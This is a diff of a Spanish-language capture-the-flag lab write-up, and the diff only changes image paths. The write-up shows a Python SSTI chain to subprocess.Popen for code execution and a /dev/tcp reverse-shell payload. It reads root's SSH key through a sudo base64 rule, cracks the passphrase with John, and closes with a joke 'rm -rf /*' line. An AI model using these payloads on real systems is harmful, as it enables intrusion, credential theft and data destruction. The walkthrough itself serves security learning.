@@ -3,15 +3,15 @@
 
 >Hoy vamos con una maquina muy buena que tiene un poco de todo, y nos ayudara a afianzar conceptos sobre SSTI, cracking de contraseñas y unos pocos conceptos de Python, vamos pues :3
 
-![\1](Attachments/Pasted%20image%2020250513163817.png)
+![\1](/Attachments/Pasted%20image%2020250513163817.png)
 
 >Primero, levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:
 
-![\1](Attachments/Pasted%20image%2020250513163908.png)
+![\1](/Attachments/Pasted%20image%2020250513163908.png)
 
 >Hacemos un Ping a la maquina victima, para verificar la conexión con trazas ICMP:
 
-![\1](Attachments/Pasted%20image%2020250513164036.png)
+![\1](/Attachments/Pasted%20image%2020250513164036.png)
 _(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)
 
 1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
@@ -20,7 +20,7 @@ _(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message P
 
 >Haremos un escaneo fuerte con Nmap para identificar puertos abiertos y sus servicios:
 
-![\1](Attachments/Pasted%20image%2020250513164213.png)
+![\1](/Attachments/Pasted%20image%2020250513164213.png)
 1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
 2. _-n (no deseo que nmap haga una resolución DNS automática)
 3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
@@ -29,31 +29,31 @@ _(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message P
 
 >Vemos el puerto 22 con una versión medio actualizada de OpenSSH, el puerto 80 con un servidor web Apache en una versión actual, y el puerto 8089 en donde también corre un servicio web con Werkzeug. Esto es curioso, lo analizamos con whatweb:
 
-![\1](Attachments/Pasted%20image%2020250513165332.png)
+![\1](/Attachments/Pasted%20image%2020250513165332.png)
 _Whatweb es una herramienta de reconocimiento web creada en Ruby, esta hecha para identificar tecnologías web (Es capaz de detectar Frameworks, plugins, CMS, etc).
 Por lo general, mediante una petición GET, recolecta información de toda la respuesta (Cookies, código HTML, encabezados), para que luego, el motor de whatweb con REGEX (expresiones regulares) y sus propios plugins (scripts) de Ruby analicen la respuesta en búsqueda de particularidades propias de tecnologías (Como wp-content para WordPress, X-Powered-By para php o /templates/Joomla para Joomla).
 Al encontrar coincidencias. usa sus propios plugins (scripts) de Ruby para identificar las tecnologías:
-![\1](Attachments/Pasted%20image%2020250506154219.png)_
+![\1](/Attachments/Pasted%20image%2020250506154219.png)_
 _En este caso, usamos la flag -t para dar 200 hilos al escaneo y la flag -a 4 para indicar la mayor agresividad sobre la web (No hay problema ya que es un entorno controlado)_
 
 >Podemos ver que corre la versión 3.11.2 de Python, y la  2.2.2 de Werkzeug. Este mismo es un kit de bibliotecas de Python para la creación de webs rápidamente.
 >Vamos a explorar la web:
 
-![\1](Attachments/Pasted%20image%2020250513165611.png)
+![\1](/Attachments/Pasted%20image%2020250513165611.png)
 
 >Vemos un panel donde se pueden introducir valores...
 
-![\1](Attachments/Pasted%20image%2020250513165712.png)
+![\1](/Attachments/Pasted%20image%2020250513165712.png)
 
 >Al enviar un valor la pagina simplemente lo refleja en la respuesta.
 >Lo primero que podemos hacer en este punto es intentar insertar comandos JavaScript para probar XSS:
 
-![\1](Attachments/Pasted%20image%2020250513165934.png)
+![\1](/Attachments/Pasted%20image%2020250513165934.png)
 _Se inserta un script sencillo en JavaScript que genera una alerta_
 
 >La web es vulnerable a inyecciones XSS, esto pasa porque la no se sanitiza bien el input (lo que se inserta en un panel) de usuario. Tristemente, en esta web no nos sirve de mucho, ya que el Cross Side Scripting ocurre cuando el servidor devuelve tal cual lo insertado por el usuario para ser ejecutado del lado del cliente, como en este caso no hay mas usuarios que accedan a esta pagina, y el valor insertado no se mantiene en la web para ser interpretado por alguien mas, no podemos explotar nada.
 
-![\1](Attachments/Pasted%20image%2020250513171331.png)
+![\1](/Attachments/Pasted%20image%2020250513171331.png)
 _A modo de traza, puedes ver en el código fuente como lo que inyectamos es leído por el HTML como código de la web y no como input de usuario_
 
 >Pero, lo anterior nos hace ver que el servidor no sanitiza bien el Input de usuario, así que podemos pensar en un posible SSTI (Server Side Template Injection)
@@ -82,7 +82,7 @@ _Ejemplo de plantillas con Flask de Python_
 >[Aqui](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) Podrás encontrar un muy buen recurso para ir probando inyecciones de plantillas.
 >Vamos a probar una ecuación:
 
-![\1](Attachments/Pasted%20image%2020250513174222.png)
+![\1](/Attachments/Pasted%20image%2020250513174222.png)
 
 >¡¡Vemos que es vulnerable!!.
 >Por lo general en este punto se empiezan a probar muchos payloads para leer archivos de la maquina, ejecutar comandos en el sistema victima y hasta obtener una Reverse Shell. Todo lo anterior podemos lograrlo husmeando un poco en Hacktricks (_El recurso que te deje arriba_). Pero, para méritos del aprendizaje, vamos a hacerlo manualmente O.O:
@@ -102,7 +102,7 @@ _Puedes definir como objeto cualquier cosa; un numero, un valor booleano o un st
 ```
 _Con esta sintaxis le indicamos a Python que deseamos ver la clase a la que pertenece el objeto (Todos los objetos tiene una clase)_
 
-![\1](Attachments/Pasted%20image%2020250515003807.png)
+![\1](/Attachments/Pasted%20image%2020250515003807.png)
 
 >Como podemos ver, la cadena vacía es de clase str, realmente saber esto no nos sirve de nada, PERO, desde aquí podemos llamar al atributo interno de las clases "_ _ mro _ " que nos muestra el orden en el que Python busca los métodos cuando son llamados:
 
@@ -110,7 +110,7 @@ _Con esta sintaxis le indicamos a Python que deseamos ver la clase a la que pert
 ' '.__class__.__mro__
 ```
 
-![\1](Attachments/Pasted%20image%2020250515005356.png)
+![\1](/Attachments/Pasted%20image%2020250515005356.png)
 
 >Lo anterior nos devuelve una tulpa con 2 clases, la que necesitamos es la clase Object que tiene en si un método del que podemos abusar para ejecutar comandos. Vamos a elegir Object
 
@@ -118,7 +118,7 @@ _Con esta sintaxis le indicamos a Python que deseamos ver la clase a la que pert
 ' '.__class__.__mro__[1]
 ```
 
-![\1](Attachments/Pasted%20image%2020250515005632.png)
+![\1](/Attachments/Pasted%20image%2020250515005632.png)
 _De esta manera elegimos el segundo item, siendo el primero igual a 0 y el segundo igual a 1_
 
 >Desde aquí, vamos a usar "_ _ subclasses _ _ ()" para listar todas las clases que existen en Object (Que es la clase base de todas las clases en Python), incluyendo las peligrosas  ╰(*°▽°*)╯
@@ -127,7 +127,7 @@ _De esta manera elegimos el segundo item, siendo el primero igual a 0 y el segun
 ' '.__class__.__mro__[1].__subclasses__()
 ```
 
-![\1](Attachments/Pasted%20image%2020250515011000.png)
+![\1](/Attachments/Pasted%20image%2020250515011000.png)
 
 >Entre esa gran respuesta que acabamos de recibir, debemos encontrar el índice de la clase "Subprocess.Popen" que nos permitirá inyectar comandos, este índice puede ser [48] o [335]
 
@@ -138,32 +138,32 @@ _De esta manera elegimos el segundo item, siendo el primero igual a 0 y el segun
 
 >Aunque tiene algunas veces Índice por defecto, lo mejor que podemos hacer es buscarlo con el intruder de burpsuite:
 
->	![\1](Attachments/Pasted%20image%2020250515012101.png)
+>	![\1](/Attachments/Pasted%20image%2020250515012101.png)
 >		_Abrimos burpsuite_
 
->	![\1](Attachments/Pasted%20image%2020250515012235.png)
+>	![\1](/Attachments/Pasted%20image%2020250515012235.png)
 >		_Nos vamos a la pestaña proxy, abrimos el navegador de Burp y empezamos a interceptar_
 
->	![\1](Attachments/Pasted%20image%2020250515013009.png)
+>	![\1](/Attachments/Pasted%20image%2020250515013009.png)
 >		_Interceptamos nuestra petición y con Ctrl+i Lo emitimos al intruder_
 
->	![\1](Attachments/Pasted%20image%2020250515013551.png)
+>	![\1](/Attachments/Pasted%20image%2020250515013551.png)
 >		_Ya en este punto, marcamos el lugar de la petición donde queremos probar combinatorias (Justo en el indice de subclasses "__subclasses__()[?]") y marcamos la casilla "add"
 
->	![\1](Attachments/Pasted%20image%2020250515014629.png)
+>	![\1](/Attachments/Pasted%20image%2020250515014629.png)
 >		_En el apartado Payloads, elegimos de tipo numérico, y el rango será de 0 hasta 500 (Pueden ser mas si lo amerita)_
 
->	![\1](Attachments/Pasted%20image%2020250515014244.png)
+>	![\1](/Attachments/Pasted%20image%2020250515014244.png)
 >		_Y por ultimo en Settings>Grep-match ingresamos con add la cadena que queremos buscar entre todas las respuestas_
 
->	![\1](Attachments/Pasted%20image%2020250515014448.png)
+>	![\1](/Attachments/Pasted%20image%2020250515014448.png)
 >		_Iniciamos el ataque_
 >		_De esta manera estamos probando 500 números para el mismo campo, buscando una respuesta que de Match con la cadena "Subprocess.Popen" que buscamos
 
->	![\1](Attachments/Pasted%20image%2020250515033025.png)
+>	![\1](/Attachments/Pasted%20image%2020250515033025.png)
 >		_Finalmente, logramos una coincidencia con el payload 496, allí tenemos nuestra clase Subprocess.Popen_
 
->	![\1](Attachments/Pasted%20image%2020250515033337.png)
+>	![\1](/Attachments/Pasted%20image%2020250515033337.png)
 
 
 >Ya que tenemos el numero de la clase que buscamos, Vamos a crear un objeto que la clase Popen pueda leer, uno que nos permita ejecutar comandos:
@@ -172,7 +172,7 @@ _De esta manera elegimos el segundo item, siendo el primero igual a 0 y el segun
 ' '.__class__.__mro__[1].__subclasses__()[496]('id', shell=True, stdout=-1)
 ```
 
-![\1](Attachments/Pasted%20image%2020250515020203.png)
+![\1](/Attachments/Pasted%20image%2020250515020203.png)
 _id será el comando que queremos ejecutar, Shell=True nos permite ejecutar los comandos como en una terminal, y stdout=-1 envía como stdout (respuesta del comando) con subprocess.PIPE para que la salida del comando se pueda ver por pantalla_
 
 >Ya tenemos nuestro Payload, ahora por ultimo, recogemos la salida de todo el proceso con el método communicate() :
@@ -181,14 +181,14 @@ _id será el comando que queremos ejecutar, Shell=True nos permite ejecutar los 
 ' '.__class__.__mro__[1].__subclasses__()[496]('id', shell=True, stdout=-1).communicate()
 ```
 
-![\1](Attachments/Pasted%20image%2020250515021156.png)
+![\1](/Attachments/Pasted%20image%2020250515021156.png)
 
 >TENEMOS RCE :3
 
 >Sin perder mas tiempo, vamos a entablarnos una reverse Shell
 >Debemos disponer nuestra máquina para recibir una Shell desde otro equipo, para esto, nos ponemos en escucha por el puerto 12345 con “nc”:
 
-![\1](Attachments/Pasted%20image%2020250515022408.png)
+![\1](/Attachments/Pasted%20image%2020250515022408.png)
 1. nc Es un binario multipropósito, sirve para ejecutar shells, transferir archivos, enviar y recibir datos, etc, etc…
 2. -n Igual que con nmap, este parámetro nos quita la resolución automática de nombres de host (para acelerar el proceso)
 3. -l Con este parámetro entramos en un modo de escucha de conexiones
@@ -197,7 +197,7 @@ _id será el comando que queremos ejecutar, Shell=True nos permite ejecutar los 
 
 >Ya estando en escucha, insertamos nuestro payload:
 
-![\1](Attachments/Pasted%20image%2020250515022602.png)
+![\1](/Attachments/Pasted%20image%2020250515022602.png)
 
 ```bash
 bash -c "bash -i >%26 /dev/tcp/172.17.0.2/12345 0>%261")
@@ -210,7 +210,7 @@ _Vamos a intentar entenderlo al máximo este comando:_
 
 >Ya estamos dentro del sistema, vamos a listar privilegios, para ver si nuestro usuario tiene permisos especiales sobre algún binario:
 
-![\1](Attachments/Pasted%20image%2020250515022835.png)
+![\1](/Attachments/Pasted%20image%2020250515022835.png)
 _Ejecutamos el binario setuid (que siempre se ejecuta como root)“SUDO”, con la flag “-l”. El binario busca los privilegios que el usuario actual tiene descritos en el archivo /etc/sudoers y los muestra por pantalla (Si aplica)_
 1. _(root) Permite ejecutar el binario como el mas privilegiado, root_
 2. _NOPASSWD Nos indica que no es necesario ingresar contraseña para ejecutar el binario_
@@ -219,44 +219,44 @@ _Ejecutamos el binario setuid (que siempre se ejecuta como root)“SUDO”, con 
 >El binario base64 nos permite por lo general codificar y decodificar en algoritmo base64. Pero particularmente esta herramienta también nos permite codificar valores que existen dentro de una variable en Linux, si determinada variable tiene una cadena como "/etc/shadow" o "/root/.ssh/id_rsa" base64 intentara codificar lo que hay dentro de ese archivo en el sistema.
 >Si un usuario normal tiene permiso para hacer esto como root, podría leer cualquier archivo de la maquina, o al menos eso dice [GTFObins](https://gtfobins.github.io/gtfobins/base64/) O.O
 
-![\1](Attachments/Pasted%20image%2020250515024758.png)
+![\1](/Attachments/Pasted%20image%2020250515024758.png)
 
 >Vamos a ponerlo en practica :3
 
 >Primero, creamos una variable que tenga como valor una ruta sensible del sistema que queramos leer:
 
-![\1](Attachments/Pasted%20image%2020250515022852.png)
+![\1](/Attachments/Pasted%20image%2020250515022852.png)
 _Esta ruta contiene la clave privada del usuario root_
 
 >Ahora ejecutamos como usuario privilegiado el binario y le pasamos la variable que creamos, para luego ejecutar una decodificación en la misma linea:
 
-![\1](Attachments/Pasted%20image%2020250515023038.png)
+![\1](/Attachments/Pasted%20image%2020250515023038.png)
 _Base64 codifica lo que hay en la ruta /root/.ssh/id_rsa con permisos elevados, a esa respuesta codificada le aplicamos un "base64 -d" para desencriptar el archivo y verlo en texto claro ya sin privilegios root.
 
 >Tenemos la clave privada ssh del usuario root. Para poderla usar, la copiamos en un archivo del mismo nombre en nuestro sistema y modificamos sus permisos.
 
-![\1](Attachments/Pasted%20image%2020250515023206.png)
+![\1](/Attachments/Pasted%20image%2020250515023206.png)
 _con chmod 600 le estamos dando permisos de lectura y escritura solamente al propietario del archivo, esto se hace para que ssh tome como valida la clave.
 
 >Intentamos ingresar por ssh como root con la clave privada:
 
-![\1](Attachments/Pasted%20image%2020250515023247.png)
+![\1](/Attachments/Pasted%20image%2020250515023247.png)
 
 >Tristemente, nos pide una contraseña adicional para poder ingresar :(
 >(_Esto nos indica que la clave privada esta encriptada y no la podemos usar sin conocer su passphrase (contraseña)_)
 >Para esto, vamos a hacer un poco de cracking de contraseñas...
 >Primero, vamos a convertir la clave encriptada a un formato que John The Ripper pueda leer:
 
-![\1](Attachments/Pasted%20image%2020250515023343.png)
+![\1](/Attachments/Pasted%20image%2020250515023343.png)
 _ssh2john es una herramienta propia del paquete "John The Ripper" que extrae el algoritmo de cifrado, el Salt (Cadena aleatoria que se concatena con la passphrase) y los datos cifrados a un formato que John puede leer (John Hash) _
 
 >Con el hash creado, lo rompemos con John:
 
-![\1](Attachments/Pasted%20image%2020250515023856.png)
+![\1](/Attachments/Pasted%20image%2020250515023856.png)
 _John, toma toda la información del hash creado por ssh2john, reconoce el algoritmo de cifrado y la cadena aleatoria (Salt) que se le concatena al cifrar la clave original, así, va cifrando posibles contraseñas (que hay en el diccionario rockyou) y comparando los hashes que generan con el real en busca de coincidencia, todo esto unas decenas de veces cada segundo._
 
 >Tenemos nuestra contraseña, solo nos queda ingresar al sistema como root ╰(*°▽°*)╯
 
-![\1](Attachments/Pasted%20image%2020250515033539.png)
+![\1](/Attachments/Pasted%20image%2020250515033539.png)
 
 O.O   //El comando "rm -rf /*" ejecutado como administrador borra todos los archivos del sistema, es un pequeño guiño al ganar acceso como root a una máquina, NO LO EJECUTES//   O.O
